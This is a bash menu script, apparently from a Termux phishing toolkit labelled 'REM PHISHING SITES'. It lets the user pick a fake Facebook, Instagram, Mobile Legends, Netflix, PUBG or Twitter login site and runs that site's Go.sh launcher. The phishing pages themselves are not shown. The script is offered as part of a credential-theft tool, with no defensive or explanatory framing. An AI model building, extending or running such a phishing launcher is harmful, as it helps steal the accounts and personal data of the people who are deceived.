clear
echo
echo
printf "\e[1;92m               REM PHISHING SITES\n\e[1;91m1. Facebook \n2. Instagram \n3. Mobile Legends \n4. Netflix \n5. PUBG \n6. Twitter\n\nFORCE STOP TERMUX IF URL MISSING OR ANY PROBLEM\n\n\t\e[1;94mEnter your choice:  \e[0m"
read choice
if [[  $choice == 1 ]]; then
cd ~/remphish/fb/
bash Go.sh
elif [[ $choice == 2 ]]; then
cd ~/remphish/insta/
bash Go.sh
elif [[ $choice == 3 ]]; then
cd ~/remphish/MLBB/
bash Go.sh
elif [[ $choice == 4 ]]; then
cd ~/remphish/Netflix/
bash Go.sh
elif [[ $choice == 5 ]]; then
cd ~/remphish/pubg/
bash Go.sh
elif [[ $choice == 6 ]]; then
cd ~/remphish/twitter/
bash Go.sh
else
echo "Please input a valid choice"
cd ~/remphish
bash Start.sh
fi
